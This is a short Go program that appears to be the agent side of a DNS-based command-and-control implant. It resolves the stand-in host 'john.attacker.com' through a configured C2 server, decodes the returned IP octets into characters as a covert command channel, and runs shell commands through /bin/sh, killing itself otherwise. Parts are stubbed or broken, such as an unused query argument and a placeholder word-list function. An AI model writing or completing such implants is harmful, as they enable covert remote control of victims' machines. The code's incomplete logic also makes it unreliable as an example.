package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
)

var (
	// The C2 server's IP address
	serverIP = "127.0.0.1"
	// The C2 server's port
	serverPort = 5353
)

func mnemonicencode(str string) {
	corpus := "hello,world,this,is,a,test,unique,list,of,words"
	fmt.Println(corpus)
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	return strings.Join(chars, "")
}

func dnsquery(query string) string {
	// Perform a dns query
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
		},
	}
	ip, _ := r.LookupHost(context.Background(), "john.attacker.com")
	return ipdecode(ip)
}

func execute(cmd string) string {
	// Execute a shell command
	out, _ := exec.Command("/bin/sh", "-c", cmd).Output()

	return string(out)
}

func kill() {
	// Get the current process id
	pid := os.Getpid()
	// Kill the process
	syscall.Kill(pid, 9)
}

func ping() {
	// Send the ping to the C2 server
	response := dnsquery("ping")

	if response == "fingerprint" {
		// If the response is fingerprint, execute the command
		execute("fingerprint")
	} else {
		kill()
	}
}

func main() {
	// Agent for the C2 server
	ping()
}
